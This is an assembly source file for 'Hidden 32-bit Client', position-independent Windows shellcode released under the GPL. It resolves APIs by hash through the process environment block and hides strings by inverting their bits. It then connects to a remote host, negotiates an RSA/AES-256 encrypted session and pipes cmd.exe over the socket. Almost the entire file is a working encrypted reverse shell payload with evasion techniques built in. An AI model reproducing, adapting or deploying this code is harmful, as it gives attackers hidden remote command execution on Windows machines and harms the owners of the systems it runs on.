; *********************************************************************
;
;   Hidden 32-bit Client v0.1
;   Windows shell code with RSA Key Exchange, AES-256 Encryption
;
;   Copyright (C) June 2014 Kevin Devine - @cmpxchg8
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
;
; *********************************************************************
  .686
  .model flat, stdcall

  includelib ws2_32.lib
  includelib advapi32.lib
  includelib kernel32.lib

  option casemap:none
  option prologue:none
  option epilogue:none

  .nolist
  .nocref

  WIN32_LEAN_AND_MEAN equ 1

  include windows.inc
  include stdio.inc
  include winsock2.inc
  include wincrypt.inc
  
  includelib msvcrt.lib
  
  ifdef USE_16
    hw typedef word
  else
    hw typedef dword
  endif
  
  .list
  .cref
  
  ROL_CONSTANT equ 9
  REMOTE_PORT  equ 80
  CRYPT_ALG    equ CALG_AES_256 
  ; alternatives are CALG_AES_128, CALG_AES_192, 
  ;                  CALG_3DES, CALG_DES, CALG_RC4,
  ;                  CALG_RC2
  
  REG struc
    lo dw ?
    hi dw ?
  REG ends
  
  PUSHAD_STRUCT struc
    _edi  REG  <>
    _esi  REG  <>
    _ebp  REG  <>
    _esp  REG  <>
    _ebx  REG  <>
    _edx  REG  <>
    _ecx  REG  <>
    _eax  REG  <>
  PUSHAD_STRUCT ends
  
  x struc
    @ne      WSANETWORKEVENTS <>     ; WSAEnumNetworkEvents
    @p       DWORD ?
    @lap     OVERLAPPED <>           ; ReadFile and GetOverlappedResult
    @buflen  DWORD ? ; holds BUFSIZ
    @out1    DWORD ? ; CreateNamedPipeA
    @in0     DWORD ? ; CreatePipe
    @in1     DWORD ? ; CreatePipe
    @out0    DWORD ? ; CreateFileA

    @evt0    DWORD ? ; WSACreateEvent
    @evt1    DWORD ? ; CreateEvent

    union
      @pi    PROCESS_INFORMATION <>  ; CreateProcessA
      @si    STARTUPINFO <>          ; CreateProcessA
    ends
    
    @len     DWORD ?
    @buf     BYTE BUFSIZ+128 dup (?)
  x ends
  
  ROL32 macro iNum:req, iBits:req
    exitm <((iNum shl iBits) and 0FFFFFFFFh) or (iNum shr (32-iBits))>
  endm
  
  HASH macro s:req
    local dwApi
    
    dwApi = 0
    forc x, <s>
      if @InStr(1, <x>, <!">) eq 0
        dwApi = ROL32((dwApi + '&x'), ROL_CONSTANT) xor '&x'
      endif
    endm
    
    dwApi = ROL32(dwApi, ROL_CONSTANT)

    ifndef USE_16
      exitm<(dwApi and 0FFFFFFFFh)>
    else
      exitm<(dwApi and 0FFFFh)>
    endif
  endm
  
  SWAP16 macro x:req
    exitm <(((x and 0FF00h) shr 8) or \
           (((x and 000FFh) shl 8))) and 0FFFFh>
  endm
  
  SWAP32 macro x:req
    exitm<((((x) and 0FF000000h) shr 24) or \
           (((x) and 000FF0000h) shr  8) or \
           (((x) and 00000FF00h) shl  8) or \
           (((x) and 0000000FFh) shl 24))>
  endm
  
  ; convert ipv4 string into binary
  INET macro s:req
    local dwIp
    local bOctet
    
    dwIp   = 0
    bOctet = 0
    
    forc x, <s>
      if @InStr (1, <x>, <!">) eq 0
        if @InStr (1, <x>, <.>) eq 1
          dwIp = dwIp or bOctet
          dwIp = dwIp shl 8
          bOctet = 0
        else
          bOctet = bOctet * 10
          bOctet = bOctet + x
        endif
      endif
      dwIp = dwIp or bOctet
    endm
    
    exitm <SWAP32(dwIp)>
  endm
  
  xcall macro x:req
    call  dword ptr [ebp-x]
  endm
  
  MHTONS macro A:req
    exitm <(((A and 0FF00h) shr 8) or \
           (((A and 000FFh) shl 8)))>
  endm
  
  CStr macro x:vararg
    local dsTxt
  .data
    dsTxt db x, 0
  .code
    exitm <offset dsTxt>
  endm
  
  .code
  assume fs:nothing

  ; ws2_32
  @socket                 equ 32*04
  @connect                equ 31*04
  @closesocket            equ 30*04
  @send                   equ 29*04
  @recv                   equ 28*04
  @WSAEventSelect         equ 27*04
  @WSACreateEvent         equ 26*04
  @WSAEnumNetworkEvents   equ 25*04
  @ioctlsocket            equ 24*04

  ; kernel32
  @CreateNamedPipeA       equ 23*04
  @CreatePipe             equ 22*04
  @CreateFileA            equ 21*04
  @GetOverlappedResult    equ 20*04
  @ReadFile               equ 19*04
  @WriteFile              equ 18*04
  @CloseHandle            equ 17*04
  @WaitForMultipleObjects equ 16*04
  @CreateEventA           equ 15*04
  @CreateProcessA         equ 14*04
  @TerminateProcess       equ 13*04
  
  ; advapi32
  @CryptAcquireContextA   equ 12*04
  @CryptGenKey            equ 11*04
  @CryptImportKey         equ 10*04
  @CryptExportKey         equ 09*04
  @CryptEncrypt           equ 08*04
  @CryptDecrypt           equ 07*04
  @CryptDestroyKey        equ 06*04
  @CryptReleaseContext    equ 05*04
  
  @hProvider              equ 04*04
  @hSessionKey            equ 03*04
  @hPublicKey             equ 02*04
  @secure                 equ 01*04
  
hidden32_start label dword

STACK_SIZE equ ((sizeof (x) + 32*4) and -4) + 4

start proc
ifdef TEST_CODE
    local wsa:WSADATA
    
    invoke LoadLibrary, CStr ("advapi32")
    invoke WSAStartup, MAKEWORD (2, 0), addr wsa
    
    call hidden32
    
    invoke WSACleanup
    invoke ExitProcess, 0
endif
start endp

; entry point of code begins here
hidden32 proc
    jmp    init
geip:
    pop    esi
    xor    eax, eax
    cdq
    mov    dl, (@cmd32_end - @cmd_start) and 255
    mov    dh, (@cmd32_end - @cmd_start) shr 8
    add    edx, esi
    jmp    edx                   ; goto outbound;
init:
    call   geip
hidden32 endp

@cmd_start label dword

hash_tbl label dword
    db (hash_tbl_end - hash_tbl) / sizeof (hw)
    ; ws2_32
    hw HASH("socket")
    hw HASH("connect")
    hw HASH("closesocket")
    hw HASH("send")
    hw HASH("recv")
    hw HASH("WSAEventSelect")
    hw HASH("WSACreateEvent")
    hw HASH("WSAEnumNetworkEvents")
    hw HASH("ioctlsocket")

    ; kernel32
    hw HASH("CreateNamedPipeA")
    hw HASH("CreatePipe")
    hw HASH("CreateFileA")
    hw HASH("GetOverlappedResult")
    hw HASH("ReadFile")
    hw HASH("WriteFile")
    hw HASH("CloseHandle")
    hw HASH("WaitForMultipleObjects")
    hw HASH("CreateEventA")
    hw HASH("CreateProcessA")
    hw HASH("TerminateProcess")
    
    ; advapi32
    hw HASH("CryptAcquireContextA")
    hw HASH("CryptGenKey")
    hw HASH("CryptImportKey")
    hw HASH("CryptExportKey")
    hw HASH("CryptEncrypt")
    hw HASH("CryptDecrypt")
    hw HASH("CryptDestroyKey")
    hw HASH("CryptReleaseContext")
hash_tbl_end label dword

; #####################################################################
;
; return address of api based on hash
;
; #####################################################################
getapi32 proc
    assume fs:nothing

    pushad
    push   30h
    pop    esi
    lods   dword ptr fs:[esi]
    mov    eax, [eax+0Ch]
    mov    esi, [eax+1Ch]
load_dll:
    mov    ebp, [esi+08h]
    test   ebp, ebp
    jz     exit_getapi
load_next:
    lodsd
    push   eax

    mov    eax, [ebp+3Ch]
    mov    eax, [ebp+eax+78h] 
    lea    esi, [ebp+eax+18h]
    lodsd
    xchg   eax, ecx
    jecxz  load_dll

    lodsd
    add    eax, ebp
    push   eax

    lodsd
    lea    edi, [ebp+eax]

    lodsd
    lea    ebx, [ebp+eax]
load_api:
    mov    esi, [edi+4*ecx-4]
    add    esi, ebp
    xor    eax, eax
    cdq
hash_api:
    lodsb
    add    edx, eax
    rol    edx, ROL_CONSTANT
    xor    edx, eax
    dec    eax
    jns    hash_api
    
    ifdef USE_16
      cmp  dx, word ptr[esp+8][PUSHAD_STRUCT._eax.lo] 
    else
      cmp  edx, dword ptr[esp+8][PUSHAD_STRUCT._eax]
    endif
    loopne load_api
    
    pop    eax
    pop    esi
    jne    load_dll

    movzx  edx, word ptr [ebx+2*ecx]
    add    ebp, [eax+4*edx]
exit_getapi:
    mov    [esp][PUSHAD_STRUCT._eax], ebp
    popad
    ret
getapi32 endp
    
; #####################################################################
;
; send data to remote system, encrypt if required
;
; #####################################################################
send32 proc
    pushad
    
    ; encrypt data?
    mov    ecx, [ebp-@secure]
    jecxz  send_data
    
    ; CryptEncrypt (hSessionKey, 0, TRUE, 0, buf, &len, BUFSIZ);
    push   [ebp][x.@buflen]      ; BUFSIZ
    push   esi                   ; &len
    lea    eax, [esi+4]
    push   eax                   ; buf
    push   edi                   ; 0
    push   ebx                   ; TRUE
    push   edi                   ; 0
    push   [ebp-@hSessionKey]
    xcall  @CryptEncrypt
    dec    eax
    jnz    exit_send
send_data:
    mov    eax, [esi]
    add    eax, 4
    ; send (s, (char*)&len, len+4, 0);
    push   edi                   ; 0
    push   eax                   ; len + 4
    push   esi                   ; len + buf
    push   ebx                   ; s
    xcall  @send
exit_send:
    test   eax, eax
    popad
    ret
send32 endp

; #####################################################################
;
; receive data from remote system, decrypt if required
;
; #####################################################################
recv32 proc
    pushad
    ; receive the length of incoming data first
    ; len=recv (s, buf, BUFSIZ, 0);
    push   edi                   ; 0
    push   4                     ; sizeof (len)
    push   esi                   ; &len
    push   ebx                   ; s
    xcall  @recv
    test   eax, eax              ; if (len<=0) goto exit_recv32;
    jle    exit_recv32
    
    push   esi
    lodsd                        ; eax=len
    mov    ecx, [ebp][x.@buflen]
    cmp    eax, ecx              ; len=(len>BUFSIZ) ? BUFSIZ : len;
    cmova  eax, ecx
    
    ; receive the data
    ; len=recv (s, buf, len, 0);
    push   edi                   ; 0
    push   eax                   ; len
    push   esi                   ; buf
    push   ebx                   ; s
    xcall  @recv
    test   eax, eax              ; if (len<=0) goto exit_recv32
    pop    esi
    jle    exit_recv32
    
    mov    ecx, [ebp-@secure]
    jecxz  exit_recv32           ; if (!@secure) goto exit_recv32

    ; CryptDecrypt (hSessionKey, 0, TRUE, 0, buf, &len);
    push   esi                   ; &len
    lodsd
    push   esi                   ; buf
    push   edi                   ; 0
    push   ebx                   ; TRUE
    push   edi                   ; 0
    push   [ebp-@hSessionKey]
    xcall  @CryptDecrypt
    test   eax, eax
exit_recv32:
    popad
    ret
recv32 endp
    
; #####################################################################
;
; Receive a Windows CAPI RSA public key.
; Generate an AES-256 session key and encrypt with public
; Send to remote peer for encryption/decryption
;
; #####################################################################
secure32 proc
    pushad
    
    ; receive the public key
    call   recv32                ; if (eax<=0) goto exit_secure;
    jle    exit_secure
    
    ; CryptAcquireContext (&hProvider, NULL, NULL, 
    ;   PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT);
    push   not 0F0000040h
    not    dword ptr[esp]        ; CRYPT_VERIFYCONTEXT or CRYPT_SILENT
    push   PROV_RSA_AES          ; PROV_RSA_FULL
    push   edi                   ; NULL
    push   edi                   ; NULL
    lea    eax, [ebp-@hProvider] 
    push   eax                   ; &hProvider
    xcall  @CryptAcquireContextA
    dec    eax                   ; if (eax!=TRUE) goto exit_secure;
    jnz    exit_secure
    
    ; Import the key received
    ; CryptImportKey (hProvider, public_key, sizeof (public_key), NULL, 0, &hPublicKey);
    push   esi
    lea    eax, [ebp-@hPublicKey]
    push   eax                   ; &hPublicKey
    push   edi                   ; 0
    push   edi                   ; NULL
    lodsd 
    push   eax                   ; len of key
    push   esi                   ; buf
    push   [ebp-@hProvider]      ; hProvider
    xcall  @CryptImportKey
    test   eax, eax              ; if (eax==FALSE) goto exit_secure;
    pop    esi
    jz     exit_secure
    
    ; Generate a session key with RC4 as algorithm
    ; CryptGenKey (hProvider, CALG_RC4, CRYPT_EXPORTABLE, &hSessionKey);
    lea    ecx, [ebp-@hSessionKey]
    push   ecx                   ; &hSessionKey
    push   eax                   ; CRYPT_EXPORTABLE=1
    push   not CRYPT_ALG         ; 
    not    dword ptr[esp]
    push   [ebp-@hProvider]      ; hProvider
    xcall  @CryptGenKey
    test   eax, eax
    jz     exit_secure
    
    ; Export the session key using public key
    ; CryptExportKey (hSessionKey, hPublicKey, SIMPLEBLOB, 0, buf, &len)
    lea    ecx, [esi+4]
    push   [ebp][x.@buflen]
    pop    dword ptr[esi]       ; len=BUFSIZ
    push   esi                  ; &len
    push   ecx                  ; buf
    push   edi                  ; 0
    push   eax                  ; SIMPLEBLOB=1
    push   [ebp-@hPublicKey]    ; hPublicKey
    push   [ebp-@hSessionKey]   ; hSessionKey
    xcall  @CryptExportKey
    
    mov    [esp][PUSHAD_STRUCT._eax], eax ; bStatus=eax
    dec    eax
    jnz    exit_secure
    
    ; send session key to remote peer
    call  send32
    
    ; we assume at this point the connection is "secure"
    inc   dword ptr [ebp-@secure]
exit_secure:
    popad
    ret
secure32 endp

; #####################################################################
;
; wait for events from socket, pi.hProcess and hStdOutput of cmd.exe
;
; #####################################################################
wait_evt proc
    pushad

    lea    esi, [ebp][x.@evt0]
    mov    eax, [ebp][x.@evt0]
    cdq
    
    ; ioctlsocket (s, FIONBIO, &off=0);
    push   edx                   ; 0
    push   esp                   ; &off
    push   8004667Eh             ; FIONBIO
    push   ebx                   ; s
    
    ; WSAEventSelect (s, evts[0], 0);
    push   edx                   ; 0
    push   eax                   ; evts[0]
    push   ebx                   ; s
    
    ; WSAEnumNetworkEvents (s, evts[0], &ne);
    push   ebp                   ; &ne
    push   eax                   ; evts[0]
    push   ebx                   ; s
    
    ; WaitForMultipleObjects (3, evts, FALSE, INFINITE) - WAIT_OBJECT_0;
    push   -1                    ; INFINITE
    push   edx                   ; FALSE
    push   esi                   ; &evts
    push   3   ; number of events to monitor
    
    ; WSAEventSelect (s, evts[0], FD_READ | FD_CLOSE);
    push   21h                   ; FD_READ or FD_CLOSE
    push   eax                   ; evts[0]
    push   ebx                   ; s
    xcall  @WSAEventSelect
    xcall  @WaitForMultipleObjects
    xchg   eax, edi              ; esi = event index
    xcall  @WSAEnumNetworkEvents
    xcall  @WSAEventSelect
    xcall  @ioctlsocket
    pop    edx                   ; remove &off
    
    ; if (ne.lNetworkEvents & FD_CLOSE) {
    ;   break;
    ; }    
    mov    esi, ebp
    lodsd
    test   al, FD_CLOSE
    mov    [esp][PUSHAD_STRUCT._edi], edi
    popad
    ret
wait_evt endp

; #####################################################################
;
; start cmd.exe with socket redirected to hStdInput, hStdOutput
;
; #####################################################################
cmd32 proc
    pushad                       ; save all
    lea    edi, [ebp][x.@out1]
    push   edi                   ; save for closing handles on exit
    
    ; create event for hStdOutput of cmd.exe, signalled / auto reset
    ; CreateEvent (NULL, TRUE, TRUE, NULL);
    push   eax                   ; NULL
    push   ebx                   ; TRUE
    push   ebx                   ; TRUE
    push   eax                   ; NULL
    
    ; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    push   ebx                   ; TRUE
    push   eax                   ; NULL
    push   sizeof (SECURITY_ATTRIBUTES)
    mov    esi, esp
    
    ; "\\.\pipe\1"
    push   not SWAP32("\1") shr 16
    not    dword ptr[esp]
    push   SWAP32("pipe")
    push   SWAP32("\\.\")
    mov    ecx, esp
    
    ; CreateFileA ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED, 0, &sa, OPEN_EXISTING, 0, NULL);
    push   eax                   ; NULL
    push   eax                   ; 0
    push   3h                    ; OPEN_EXISTING
    push   esi                   ; &sa
    push   eax                   ; 0
    push   not 2000000h          ; MAXIMUM_ALLOWED
    not    dword ptr[esp]
    push   ecx                   ; "\\\\.\\pipe\\1", 0
    
    ; CreateNamedPipeA ("\\\\.\\pipe\\1", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
    ;    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
    ;    PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);      
    push   eax                   ; NULL
    push   eax                   ; 0
    push   eax                   ; 0
    push   eax                   ; 0
    push   1                   ; 1 here, PIPE_UNLIMITED_INSTANCES=255
    push   eax                   ; PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT
    push   not 40000003h         ; PIPE_ACCESS_DUPLEX or FILE_FLAG_OVERLAPPED
    not    dword ptr[esp]
    push   ecx                   ; "\\\\.\\pipe\\1", 0
    xcall  @CreateNamedPipeA
    stosd                        ; save out[1]
    cdq
    
    ; CreatePipe (&in[1], &in[0], &sa, 0);
    push   edx                   ; 0
    push   esi                   ; &sa
    push   edi                   ; &in[0]
    scasd                        ; edi += 4
    push   edi                   ; &in[1]
    mov    esi, edi              ; esi = &in[1]
    scasd                        ; edi += 4
    xcall  @CreatePipe           ; should return TRUE    
    xcall  @CreateFileA
    stosd                        ; save out[0]
    add    esp, sizeof (SECURITY_ATTRIBUTES) + 3*4
    
    ; create event for socket read and close events
    xcall  @WSACreateEvent
    stosd                        ; save evts[0]
    
    xcall  @CreateEventA
    stosd                        ; save evts[1]
    mov    [ebp][x.@lap.hEvent], eax
    cdq
    
    ; "cmd", 0
    push   not SWAP32("cmd") shr 8
    not    dword ptr[esp]
    mov    eax, esp
    
    ; CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    push   edi                   ; &pi
    push   edi                   ; &si
    push   edx                   ; NULL
    push   edx                   ; NULL
    push   edx                   ; 0
    push   ebx                   ; TRUE
    push   edx                   ; NULL
    push   edx                   ; NULL
    push   eax                   ; "cmd", 0
    push   edx                   ; NULL
    
    push   sizeof (STARTUPINFO)
    pop    dword ptr [edi][STARTUPINFO.cb]
    inc    dword ptr [edi][STARTUPINFO.dwFlags+1] ; STARTF_USESTDHANDLES
    
    lea    edi, [edi][STARTUPINFO.hStdInput]
    movsd                        ; si.hStdInput = in[1];
    lodsd                        ; eax = out[0]
    stosd                        ; si.hStdOutput = out[0]
    stosd                        ; si.hStdError  = out[0]
    xcall  @CreateProcessA
    pop    eax                   ; remove "cmd", 0
    mov    esi, edi
cmd_loop:
    pushad                       ; save all
    
    ; wait for events
    call   wait_evt
    jnz    cmd_cleanup           ; socket closed

    ; zero signal indicates data received on socket
    test   edi, edi
    jz     receive_data          ; evts[0] ?
    
    ; if not 1, assume it's cmd.exe terminating or undefined error
    dec    edi
    jnz    cmd_cleanup

    ; if (pending == 0) goto read_data;
    cmp    dword ptr[ebp][x.@p], edi
    mov    eax, [ebp][x.@out1]   ; eax=out[1]
    lea    edx, [ebp][x.@lap]    ; edx=&lap
    jz     read_data
    
    ; if (!GetOverlappedResult (out[1], &lap, &len, FALSE) break;
    push   edi                   ; FALSE
    push   esi                   ; &len
    push   edx                   ; &lap
    push   eax                   ; out[1]
    xcall  @GetOverlappedResult
    dec    eax
    jnz    cmd_cleanup
    jmp    send_data
read_data:
    ; ReadFile (out[1], buf, BUFSIZ, &len, &lap);
    push   edx                   ; &lap
    push   esi                   ; &len
    push   [ebp][x.@buflen]      ; BUFSIZ
    lea    ecx, [esi+4]
    push   ecx                   ; buf
    push   eax                   ; out[1]
    xcall  @ReadFile
    
    inc    dword ptr[ebp][x.@p]  ; pending++;
send_data:
    mov    ecx, [esi]            ; ecx=len
    jecxz  continue              ; if (len==0) goto continue;
    
    dec    dword ptr[ebp][x.@p]  ; pending--;

    call   send32
    
    jmp    continue              ; goto continue;
receive_data:
    call   recv32                ; if (recv32()<=0) goto cmd_cleanup;
    jle    cmd_cleanup
    
    ; WriteFile (in[0], buf, len, &len, 0);
    push   edi                   ; 0
    push   esi                   ; &len
    lodsd
    push   eax                   ; len
    push   esi                   ; buf
    push   [ebp][x.@in0]         ; in[0]
    xcall  @WriteFile
continue:
    popad
    jmp    cmd_loop
cmd_cleanup:
    popad

    ; get last error code from PEB
    ; only useful for debugging
    ;push   34h
    ;pop    ecx
    ;mov    ecx, [fs:ecx]
    
    ; TerminateProcess (pi.hProcess, GetLastError());
    push   ecx
    push   [ebp][x.@pi.hProcess]
    xcall  @TerminateProcess
    
    ; for (int i=0; i<8; i++) {
    ;   CloseHandle (h[i]);
    ; }
    pop    esi                   ; esi=&h[0];
    push   8
    pop    ebx
close_loop:
    lodsd
    push   eax
    xcall  @CloseHandle
    dec    ebx
    jnz    close_loop

    popad
    ret
cmd32 endp
@cmd32_end label dword

; #####################################################################
;
; open connection to remote computer
;
; #####################################################################
outbound proc
    pushad 
    
    ; Initialize space for API addresses and variables
    mov    ecx, -STACK_SIZE 
    neg    ecx
    sub    esp, ecx
    
    ; zero initialize
    mov    edi, esp
    rep    stosb
    
    mov    edi, esp
    
    lodsb                        ; eax = number of hashes
    xchg   eax, ecx
init_api:                        ; do {
ifndef USE_16
    lodsd                        ;   get 32-bit hash
else
    lodsw                        ;   get 16-bit hash
endif
    call   getapi32              ;   resolve API address
    test   eax, eax
    jz     exit_init
    stosd                        ;   save
    loop   init_api              ; } while (--ecx)
    
    lea    ebp, [edi+sizeof(DWORD)*4]
    
    push   ecx                   ; IPPROTO_IP
    mov    cl, x.@len and 255
    lea    esi, [ebp+ecx]
    xor    edi, edi
    
    ; s=socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
    push   1                     ; SOCK_STREAM
    push   2                     ; AF_INET
    xcall  @socket
    xchg   eax, ebx
    test   ebx, ebx              ; if (eax<=0) goto exit_init;
    jle    exit_init
    
    push   not INET("127.0.0.1")
    not    dword ptr[esp]
    push   not ((MHTONS(REMOTE_PORT) shl 16) or AF_INET)
    not    dword ptr[esp]
    mov    ecx, esp
    
    ; connect (s, &sin, sizeof (sin));
    push   16                    ; sizeof (sin)
    push   ecx                   ; &sin
    push   ebx                   ; s
    xcall  @connect
    pop    ecx
    pop    ecx
    inc    eax                   ; if (eax==SOCKET_ERROR) goto close_socket;
    jz     close_socket          
    
    mov    [ebp][x.@buflen], not BUFSIZ
    not    [ebp][x.@buflen]
    
    dec    eax
    call   secure32              ; attempt to secure the connection
    dec    eax
    jnz    close_socket          ; if not zero, close 
    
    ; run CMD.EXE
    call   cmd32
    
    ; secured?
    dec    dword ptr [ebp-@secure]
    jnz    close_socket
    
    ; CryptDestroyKey (hSessionKey);
    push   dword ptr [ebp-@hSessionKey]
    xcall  @CryptDestroyKey
    
    ; CryptDestroyKey (hPublicKey);
    push   dword ptr [ebp-@hPublicKey]
    xcall  @CryptDestroyKey
    
    ; CryptReleaseContext (hProvider, 0);
    push   esi
    push   dword ptr [ebp-@hProvider]
    xcall  @CryptReleaseContext
    
close_socket:
    ; closesocket (s);
    push   ebx
    xcall  @closesocket
    
exit_init:
    sub    esp, -STACK_SIZE
    popad
    ret
outbound endp

hidden32_end label dword

    end start
        
; Copyright (c) June 2014 Kevin Devine
